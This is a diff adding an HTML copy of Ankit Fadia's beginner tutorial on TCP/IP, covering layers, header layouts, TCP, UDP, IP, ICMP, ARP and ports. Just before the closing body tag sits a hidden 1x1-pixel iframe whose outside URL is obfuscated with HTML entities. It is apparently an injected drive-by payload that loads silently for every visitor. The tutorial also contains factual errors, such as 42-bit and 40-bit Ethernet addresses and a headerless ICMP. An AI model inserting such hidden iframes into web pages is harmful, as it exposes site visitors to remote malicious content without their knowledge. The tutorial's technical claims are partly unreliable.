@@ -1,0 +1,270 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+<META NAME="Generator" CONTENT="Microsoft Word 97">
+<TITLE>Hacking Truths: What They Don't Teach in Manuals!!! Ankit Fadia nkit@bol.net.in</TITLE>
+</HEAD>
+<BODY LINK="#0000ff">
+
+<FONT SIZE=2><P>_________________________________________________________________________</P>
+
+<P>TCP\IP: A Mammoth Description By Ankit Fadia </FONT><A HREF="mailto:ankit@bol.net.in"><FONT SIZE=2>ankit@bol.net.in</FONT></A></P>
+<FONT SIZE=2><P>_________________________________________________________________________</P>
+
+<P>TCP\IP or Transmission Control Protocol \ Internet Protocol is a stack or collection of various protocols. A protocol is basically the commands or instructions using which two computers within a local network or the Internet can exchange data or information and resources. </P>
+
+<P>Transmission Control Protocol \ Internet Protocol  or the TCP\IP  was developed around the time of the ARPAnet. It is also known as the Protocol Suite. It consists of various protocols but as the TCP</P>
+<P>(Transmission Control Protocol) and the IP (Internet Protocol) are the most, well known of the suite of protocols, the entire family or suite is called the TCP\IP suite.</P>
+
+<P>The TCP\ IP Suite is a stacked suite with various layers stacked on each other, each layer looking after one aspect of the data transfer. Data is transferred from one layer to the other. The Entire TCP\ IP suite can be broken down into the below layers-:</P>
+
+<P>Layer Name                                                  Protocol                 </P>
+
+<P>Link Layer (Hardware, Ethernet)                ARP, RARP, PPP, Ether</P>
+<P>Network Layer(The Invisible Layer)           IP, ICMP</P>
+<P>Transport Layer                                           UDP, TCP</P>
+<P>Application Layer(The Visible Layer)        The Actual running Applications like-: FTP client, Browser</P>
+<P>Physical Layer (Not part of TCP \IP)          Physical Data Cables, Telephone wires</P>
+
+<P>Data travels from the Link Layer down to the Physical Layer at the source and at the destination it travels from the Physical Layer to the Link Layer. We will later discuss what each layer and each protocol does.</P>
+
+<P>The TCP\IP suite not only helps to transfer data but also has to correct various problems that might occur during the data transfer. There are basically two types of most common errors that might occur during the process of data transfer. They are-:</P>
+
+<P>Data Corruption -: In this kind of error, the data reaches the destination after getting corrupted.</P>
+<P>Data Loss -: In this kind of error, the entire collection of packets which constitute the data to be transferred does not reach the destination.</P>
+
+<P>TCP\IP expects such errors to take place and has certain features which prevent, such error which might occur.</P>
+
+<P>Checksums-: A checksum is a value (Normally, a 16 Bit Value) that is formed by summing up the Binary Data in the used program for a given data block. The program being used is responsible for the calculation of the Checksum value. The data being sent by the program sends this calculated checksum value, along with the data packets to the destination. When the program running at the destination receives the data packets, it re-calculates the Checksum value. If the Checksum value calculated by the Destination program matches with the Checksum Value attached to the Data Packets by the Source Program match, then the data transfer is said to be valid and error free. Checksum is calculated by adding up all the octets in a datagram.</P>
+
+<P>&nbsp;</P>
+<P>Packet Sequencing-: All data being transferred on the net is broken down into packets at the source and joined together at the destination.  The data is  broken down into packets  in a particular sequence at the source.  This means that, for example, the first byte has the first sequence number and the second byte the second sequence number  and so on. These packets are free to travel independently on the net, so sometimes, when the data packets reach the destination they arrive, out of sequence, which means that the packet which had the first sequence number attached to it does not reach the destination first. Sequencing defines the order in which the hosts receive the data packets or messages. The application or the layer running at the destination automatically builds up the data from the sequence number in each packet.</P>
+<P>The source system breaks the data to be transferred into smaller packets and assigns each packet a unique sequence number. When the destination gets the packets, it's starts rearranging the packets by reading the sequence numbers of each packet to make the data received usable.</P>
+
+<P>For example, say you want to transfer a 18000 octet file.  Not all networks can handle the entire 18000 octet packets  at a time. So the huge file is broken down into smaller say 300 octet packets. Each packet has been assigned a unique sequence number. Now when the packets reach the destination the packets are put back together to get the usable data. Now during the transportation process, as the packets can move independently on the net, it is possible that the packet 5 will arrive at the destination before packet 4 arrives. In such a situation, the sequence numbers are used by the destination to rearrange the data packets in such a way that even if Data packet 5 arrived earlier, Packet 4 will always precede Packet 5.</P>
+
+<P>A data can easily be corrupted while it is being transferred from the source to the destination. Now if a error control service is running then if it detects data corruption, then it asks the source to re-send the packets of data. Thus only non corrupted data reaches the destination. An error control service detects and controls the same  two types of errors-:</P>
+
+<P>1.)  Data Loss</P>
+<P>2.) Data Corruption</P>
+
+<P>The Checksum values are used to detect if the data has been modified or corrupted during the transfer from source  to destination or any corruption in the communication channel which may have caused data loss.</P>
+<P>Data Corruption is detected by the Checksum Values and by performing Cyclic Redundancy Checks</P>
+<P>(CRC 's). CRC 's too like the Checksums are integer values but require intensely advanced calculation and hence are rarely used.</P>
+
+<P>There is yet another way of detecting data corruption-:  Handshaking. </P>
+
+<P>This feature ensures demands that both the source and destination must transmit and receive acknowledgement messages, that confirm transfer of uncorrupted data. Such acknowledgement messages are known as ACK messages.</P>
+
+<P>Let's take an example of a typical scenario of data transfer between two systems.</P>
+<P>Source Sends MSG1 to Destination.  It will not send MSG2 to Destination unless and until it gets the MSG ACK and destination will not send more requests for data or the next request message (MSG2) unless it gets the ACK from Source confirming that the MSG1 ACK was received by it. If the source does not get a ACK message from the destination, then something which is called a timed-out occurs and the source will re send the data to destination.</P>
+
+<P>So this means that if A sends a data packet to B and B checksums the data packet and finds the data corrupted, then it can simply delete for a time out to take place. Once the time out takes place, A will re send the data packet to B. But this kind of system of deleting corrupt data is not used as it is inefficient and time consuming. </P>
+
+<P>Instead of deleting the corrupt data and waiting for a time out to take place, the destination (B) sends a not acknowledged or NACK message to source(A). When A gets the NACK message, instead of waiting for a time out to take place, it straightaway resends the data packet.</P>
+
+<P>An ACK message of 1000 would mean that all data up to 1000 octets has been received till now.</P>
+
+<P>TCP/ IP is a layered suite of protocols. All layers are equally important and with the absence of even a single layer, data transfer would not have been possible. Each TCP/ IP layer contributes to the entire process of data transfer. An excellent example, is when you send an email. For sending mail there is a separate protocol, the SMTP protocol which belongs to the Application layer. The SMTP Application protocol like all other application layer protocols assumes  that there is a reliable connection existing between the two computers. For the SMTP application protocol to do what it is designed for, i.e. to send mail, it requires the existence of all other Layers as well. The Physical Layer i.e. cables and wires  is required to transport the data physically. The Transmission Control Protocol or the TCP protocol which belongs to the Transport Layer is needed to keep track of the number of packets sent and for error correction. It is this protocol that makes sure that the data reaches the other end. The TCP protocol is called by the Application Protocol to ensure error free communication between the source and destination. For the TCP layer to do its work properly i.e. to ensure that the data packets reach the destination, it requires the existence of the Internet Protocol or IP.  The IP protocol contains the Checksum and Source and Destination IP address.</P>
+
+<P>You may wonder why do we need different protocols like TCP and IP and why not bundle them into the same Application protocol.? The TCP protocol contains commands or functions which are needed by various application protocols like FTP, SMTP and also HTTP. The TCP protocol also calls on the IP protocol, which in turn contains commands or functions which some application protocols require while others don’t. So rather than bundling the entire TCP and IP protocol set into specific application protocols, it is better to have different protocols which are called whenever required.</P>
+
+<P>The Link Layer which is the Hardware or Ethernet layer is also needed for transportation of the data packets. The PPP or the Point to Point Protocol belongs to this layer. Before we go on let's get accustomed with certain TCP\IP terms. Most people get confused between datagrams and packets and think that they are one and the same thing . You see, a datagram is a unit of data which is used by various protocols and a packet is a physical object or thing which moves on a physical medium like a wire. There is a remarkable difference between a Packet and a Datagram, but it is beyond the scope of this book. To make things easier I will use only the term datagram (Actually this is the official term.)while discussing various protocols.</P>
+
+<P>Two different main protocols are involved in transporting packets from source to destination.</P>
+
+<P>1.) The Transmission Control Protocol or the TCP Protocol</P>
+<P>2.) The Internet Protocol or the IP protocol.</P>
+
+<P>Besides these two main protocols, the Physical Layer and the Ethernet Layer are also indispensable to data </P>
+<P>transfer. </P>
+
+<P>THE TRANSPORT LAYER</P>
+
+<P>The TCP protocol</P>
+
+<P>The Transmission Control Protocol is responsible for breaking up the data into smaller datagrams and putting the datagrams back to form usable data at the destination. It also resends the lost datagrams to destination where the received datagrams are reassembled in the right order. The TCP protocol does the bulk of work but without the IP protocol, it cannot transfer data.</P>
+
+<P>Let's take an example to make things more clearer. Let's say your Internet Protocol Address or IP address is xxx.xxx.xxx.xxx or simply x and the destination's IP is yyy.yyy.yyy.yyy or simply y.  Now As soon as the three-way connection  is established between x and y, x knows the destination IP address and also the Port to which it is connected to. Both x and y are in different networks which can handle different sized packets. So in order to send datagrams which are in receivable size, x must know what is the maximum datagram size which y can handle. This too is determined by both x and y during connection time.</P>
+
+<P>So once x knows the maximum size of the datagram which y can handle, it breaks down the data into smaller chunks or datagrams. Each datagram has it's own TCP header which too is put by TCP.</P>
+<P>A TCP Header contains a lot of information, but the most important of it is the Source and Destination IP and Port numbers and yes also the sequence number.</P>
+
+<P>**************</P>
+<P>HACKING TRUTH: Learn more about Ports, IP's, Sockets in the Net Tools Manual</P>
+<P>**************</P>
+<P>The source which is your computer(x) now knows what the IP Addresses and Port Numbers of the Destination and Source computers are. It now calculates the Checksum value by adding up all the octets of the datagram and puts the final checksum value to the TCP Header. The different octets and not the datagrams are then numbered. An octet would be a smaller broken down form of the entire data. TCP then puts all this information into the TCP header of each datagram. A TCP Header of a datagram would finally look like -:</P>
+
+<P>&nbsp;</P>
+<pre>   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+<P>    |          Source Port          |       Destination Port        |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |                        Sequence Number                        |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |                    Acknowledgment Number                      |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |  Data |           |U|A|P|R|S|F|                               |</P>
+<P>    | Offset| Reserved  |R|C|S|S|Y|I|            Window             |</P>
+<P>    |       |           |G|K|H|T|N|N|                               |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |           Checksum            |         Urgent Pointer        |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |   The Actual Data form the next 500 octets                    |</P>
+<P>    |                                                               |</P>
+</pre>
+<P>&nbsp;</P>
+<P>There are certain new fields in the TCP header which you may not know off. Let's see what these new fields signify. The Windows field specifies the octets of new data which is ready to be processed. You see not all computers connected to the Internet run at the same speed and to ensure that a faster system does not send datagrams to a slow system at a rate which is faster than it can handle, we use the Window field. As the computer receives data , the space in the Window field gets decreased indicating that the receiver has received the data. When it reaches zero the sender stops sending further packets. Once the receiver finishes processing the received data, it increases the Window field, which in turn indicates that the receiver has processed the earlier sent data and is ready to receive more chunks of data.</P>
+
+<P>The Urgent Field tells the remote computer to stop processing the last octet and instead receive the new octet. This is normally not commonly used.</P>
+
+<P>The TCP protocol is a reliable protocol, which means that we have a guarantee that the data will arrive at the destination properly and without any errors.  It ensures that the data being received by the receiving end is arranged in the same correct order in which it was sent.</P>
+
+<P>The TCP Protocol relies on a virtual circuit between the client and the host. The circuit is opened via a 3 part process known as the three part handshake. It supports full duplex transportation of data which means that it provides a path for two way data transfer. Hence using the TCP protocol, a computer can send and receive datagrams at the same time.</P>
+
+<P>Read RFC 793 for further in depth details about the TCP protocol.</P>
+
+<P>The User Datagram Protocol or the UDP Protocol</P>
+
+<P>The User Data protocol or the UDP is yet another protocol which is a member of the Transport Layer. TCP is the standard protocol used by all systems for communications. TCP is used to break down the data to be transported into smaller datagrams, before they (the datagrams) are sent across a network. Thus we can say that TCP is used where more than a single or multiple datagrams are involved. </P>
+
+<P>Sometimes, the data to be transported is able to fit into a single datagram. We do not need to break the data into smaller datagrams as the size of the data is pretty small. The perfect example of such data is the DNS system. To send out the query for a particular domain name, a single datagram is more than enough. Also the IP that is returned by the Domain Name  Server does not require more than one datagram for transportation. So in such cases instead of making use of the complex TCP protocol, applications fall back to the UDP protocol.</P>
+
+<P>The UDP protocol works almost the way TCP works. But the only differences being that TCP breaks the data to be transferred into smaller chunks, does sequencing by inserting  a sequence number in the header and no error control. Thus we can conclude by saying that the UDP protocol is an unreliable protocol with no way to confirm that the data has reached the destination.</P>
+
+<P>The UDP protocol does insert a USP header to the single datagram it is transporting. The UDP header contains the Source and Destination IP Addresses and Port Numbers and also the Checksum value. The UDP header is comparatively smaller than the TCP Header.</P>
+
+<P>It is used by those applications where small chunks of data are involved. It offers services to the User's Network Applications like NFS(Network File Sharing) and SNMP.</P>
+
+<P>Read RFC 768 for further in depth details about the UDP protocol.</P>
+<P> </P>
+<P>THE NETWORK LAYER</P>
+
+<P>The IP Protocol</P>
+
+<P>Both the TCP and the UDP protocols, after inserting the headers to the datagram(s) given to them pass them to the Internet Protocol or the IP Protocol.  The main job of the IP protocol is to find a way of transporting the datagrams to the destination receiver. It does not do any kind of error checking. </P>
+
+<P>The IP protocol too adds it's own IP Header to each datagram. The IP header contains the source and destination IP addresses, the protocol number and yet another checksum. The IP header of a particular datagram looks like-:</P>
+<pre>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |Version|  IHL  |Type of Service|          Total Length         |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |         Identification        |Flags|      Fragment Offset    |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |  Time to Live |    Protocol   |         Header Checksum       |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |                       Source Address                          |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |                    Destination Address                        |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |  TCP header info followed by the actual data being transferred|</P>
+<P>    |                                                               |</P>
+</pre>
+<P>&nbsp;</P>
+<P>The Source and destination IP addresses and needed so that…well it is obvious isn't it? The Protocol number is added so that the IP protocol knows to which Transport Protocol the datagram has to be passed.</P>
+<P>You see various Transport Protocols are used like for example TCP or UDP. So this protocol number is inserted to tell IP the protocol to which the datagram has to be passed. </P>
+
+<P>It too inserts it's own Checksum value which is different from the Checksum Value inserted by the Transport Protocols. This Checksum has to be inserted as without it the Internet Protocol will not be able to verify if the Header has been damaged in the transfer process and hence the datagram might reach a wrong destination. The Time to Live field specifies a value which is decreased each time the datagram passes through a network. Remember Tracert?</P>
+
+<P>The Internet Protocol Header contains other fields as well, but they are quite advanced and cannot be included in a manual which gives an introduction to the TCP\IP protocol. To learn more about the IP protocol read RFC 791.</P>
+
+<P>The Internet Control Message Protocol or the ICMP</P>
+
+<P>The ICMP protocol allows hosts to transfer information on errors that might have occurred during the data transfer between two hosts.  It is basically used to display error messages about errors that might occur during the data transfer. The ICMP is a very simple protocol without any headers. It is most commonly used to diagnose Network Problems. The famous utility PING is a part of the ICMP protocol. ICMP requests do not require the user or application to mention any port number as all ICMP requests are answered by the Network Software itself. The ICMP protocol too handles only a single datagram. That's why we say in PING only a single datagram is sent to the remote computer. This protocol can remote many network problems like Host Down, Congested Network etc</P>
+
+<P>Read RFC 792 for further in depth details about the ICMP protocol.</P>
+
+<P>The Link Layer</P>
+
+<P>Almost all networks use Ethernet. Each machine in a network has it's own IP address and it's Ether Address. The Ether Address of a computer is different than it's IP address. An Ether Address is a 42 bit address while the IP address is only a 32 bit address. A Network must know which computer to deliver the datagram to. Right? For this the Ether Header is used. </P>
+
+<P>The Ether Header is a 14 octet header that contains the Source and Destination Ethernet address, and a type code. Ether too calculates it's own Checksum value. The Type code relates to the protocol families to be used within the Network. The Ether Layer passes the datagram to the protocol specified by this field after inserting the Ether Header. There is simply no connection between the Ethernet Address and the IP address of a machine. Each machine needs to have a Ethernet to IP address translation table on its hard disk.</P>
+<pre>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |       Ethernet destination address (first 32 bits)             |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    | Ethernet dest (last 16 bits)  |Ethernet source (first 16 bits) |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |       Ethernet source address (last 32 bits)                   |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |        Type code                                               |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |  IP header, then TCP header, then your data                    |</P>
+<P>    |                                                                |</P>
+<P>    |                                                                |</P>
+<P>    | &#9;&#9;&#9;&#9;&#9;&#9;&#9;                                   |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+<P>    |                       Ethernet Checksum                        |</P>
+<P>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</P>
+</pre>
+<P>Address Resolution Protocol or ARP</P>
+
+<P>Data before being transmitted across the Internet or across a local network is broken down into smaller Packets which are suitable for transfer over the net. These packets have the Source and Destination IP's but for the transfer to take place the suitable Hardware Addresses or the MAC addresses must also be known. That is where ARP comes in.</P>
+
+<P>To get the Hardware MAC addresses, ARP or Address Resolution Protocol sends a request message. The Router replies with the Hardware Address. It is similar to the DNS and it too has a cache. This cache can be a bit vulnerable as a Hacker could forge a connection from a remote machine claiming to be one of the cached locations. So we can conclude that ARP translates IP's into Ethernet Addresses. One thing to remember about ARP is that it only translates outgoing packets.</P>
+
+<P>There is also something called the RARP which is an abbreviation for Reverse Address Resolution   Protocol, which like the name says does exactly reverse of what ARP does.</P>
+
+<P>There is simply no algorithm to get the Ethernet Address from the IP Address. To carry out such translations, each computer has a file which has a table with rows for each computer and two columns for their corresponding IP address and Ethernet Address. The File is somewhat like the following-:</P>
+
+<P>                                      Internet Protocol Address                         Ethernet Address</P>
+<P>Computer Name              xxx.xy.yy.yx                                           08-00-39-00-2F-C3</P>
+
+<P>Say there are a system in a Network (A) and an unidentified system (B) contacts it. Now A only knows the IP address of B. Now A will first try to identify whether B is the same network so that it can directly communicate via Ethernet. So it will first check the IP to MAC address translation table which it has. If it finds the IP in the table then well and good and A will establish a connection with B via Ethernet. </P>
+
+<P>On the Other hand if A does not find any match for the specific IP, it will send out a request in the form of a 'Broadcast'. All computers within the Network will receive this broadcast and will search their own IP to MAC translation table and will reply with the necessary MAC address. A basic difference between an Ip address and MAC address is that an IP is the form xxx.xxx.xxx.xxx and a MAC address is in the form </P>
+<P>xx:xx:xx:xx:xx:xx and one is 32 bit while the other is 40 bit.</P>
+
+<P>Read RFC 826 for further in depth details about the ARP protocol.</P>
+
+<P>Application Layer</P>
+
+<P>Till now  you  have learnt  how data is broken down into smaller chunks, and transferred to the destination, where the chunks are rearranged. But there is yet another aspect to a successful data transfer process, which we have not discussed yet: The Application Protocols and the Application Layer itself. A host which receives datagrams has many applications or services (daemons) running which are ready to establish a TCP connection and accept a message. Datagrams travelling on the Internet must know which application they have to establish connection with, which application they have to send the message to. A typical web server will have the FTP daemon, the HTTP daemon, the POP daemon, and the SMTP daemon running.</P>
+<P>Wouldn't the datagrams get confused as to which daemon to send the message to.</P>
+
+<P>For the datagrams to know which computer to send the message to, we have IP addresses. The datagram knows what daemon or application to send the message to by the Port Number attached to the IP address of the Destination. A TCP address is actually fully described by 4 numbers; The IP address of the Source and Destination and the TCP Port Numbers of each end to which data is to be sent. These numbers are found in the TCP Header.</P>
+
+<P>To make it simpler to understand I have included an excerpt from the Net Tools Chapter:</P>
+
+<P>What is all the hype about socket programming? What exactly are sockets? </P>
+
+<P>TCP\IP or Transmission Control Protocol\ Internet Protocol is the language or the protocol used by computers to communicate with each other over the Internet. Say a computer whose IP address is 99.99.99.99 wants to communicate with another machine whose IP address is 98.98.98.98 then would will happen? </P>
+
+<P>The machine whose IP is 99.99.99.99 sends a packet addressed to another machine whose IP is</P>
+<P>98.98.98.98. When 98.98.98.98 receives the packet then it verifies that it got the message by sending a</P>
+<P>signal back to 99.99.99.99.But say the person who is using 99.99.99.99 wants to have simultaneously  more</P>
+<P>than one connections to 98.98.98.98.....then what will happen? Say 99.99.99.99 wants to connect to </P>
+<P>the FTP daemon and download a file by FTP and at the same time it wants to connect to 98.98.98.98's </P>
+<P>website i.e. The HTTP daemon. Then 98.98.98.98. will have 2 connects with 99.99.99.99 simultaneously. Now how can 98.98.98.98.distinguish between the two connections...how does 98.98.98.98. know which </P>
+<P>is for the FTP daemon and which for the HTTP daemon? If there was no way to distinguish between the </P>
+<P>two connections then they would both get mixed up and there would be a lot of chaos with the message </P>
+<P>meant for the HTTP daemon going to the FTP daemon. To avoid such confusion we have ports. At each </P>
+<P>port a particular service or daemon is running by default. So now that the 99.99.99.99 computers knows </P>
+<P>which port to connect to, to download a FTP file and which port to connect to, to download the web page, </P>
+<P>it will communicate with the 98.98.98.98 machine using what is known as the socket pair which is a</P>
+<P>combination of an IP address and a Port. So in the above case the message which is meant for the FTP daemon  will be addressed to 98.98.98.98 : 21 (Notice the colon and the default FTP port suceeding it.). </P>
+<P>So that the receiving machine i.e. 98.98.98.98 will know for which service this message is meant for and to </P>
+<P>which port it should be directed to.</P>
+
+<P>In TCP\IP or over the Internet all communication is done using the Socket pair i.e. the combination of the IP address and the port.</P>
+
+<P>*****************</P>
+<P>HACKING TRUTH: Learn More about Ports, IP addresses and Sockets by reading the Net Tools Chapter.</P>
+<P>*****************</P>
+<P>The Application Layers basically consists of the Applications running on your computer and the Applications running on the host to which you are connected. Say you are viewing the Hotmail Site, then the application layer comprises of the Web Browser running on your computer and the HTTP daemon running at Hotmail's server and the Application Protocol being used to communicate is HyperText Transfer Protocol. </P>
+
+<P>As soon as a TCP connection is established the Applications running on Each end decide the language or protocol to be used to communicate and send datagrams.</P>
+
+<P>Coming Soon: IP Spoofing , DNS, DNS Spoofing, Dos Utilities in Technical terms, Port Scanning in     </P>
+<P>                        TCP\IP terms.</P>
+
+<P>Ankit Fadia</P>
+<P></FONT><A HREF="mailto:Ankit@bol.net.in"><FONT SIZE=2>ankit@bol.net.in</FONT></A></P>
+<FONT SIZE=2>
+<P>To get everything you ever dreamt of written by Ankit Fadia </P>
+<P>Join his mailing list by sending an email to:</P>
+<P>programmingforhackers-subscribe@egroups.com</P>
+
+<P>&nbsp;</P>
+<P>&nbsp;</P></FONT><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
